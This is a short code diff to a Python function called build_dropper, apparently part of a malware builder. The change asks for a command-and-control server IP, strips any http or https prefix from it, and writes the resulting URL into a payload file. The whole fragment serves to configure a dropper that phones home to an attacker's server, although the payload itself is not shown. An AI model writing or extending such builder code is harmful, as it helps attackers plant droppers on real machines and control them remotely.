@@ -66,9 +66,11 @@ def build_dropper():
     )
 
     # Replace C2 URL
-    # Ask user for IP? For automation, we'll use the variable or args.
     c2_ip = input(f"[?] Enter C2 Server IP [Default: {DEFAULT_C2_IP}]: ").strip()
     if not c2_ip: c2_ip = DEFAULT_C2_IP
+    
+    # Sanitize input: remove scheme if user typed it
+    c2_ip = c2_ip.replace("http://", "").replace("https://", "").rstrip("/")
     
     new_url = f'http://{c2_ip}:{DEFAULT_C2_PORT}'
     payload_content = re.sub(
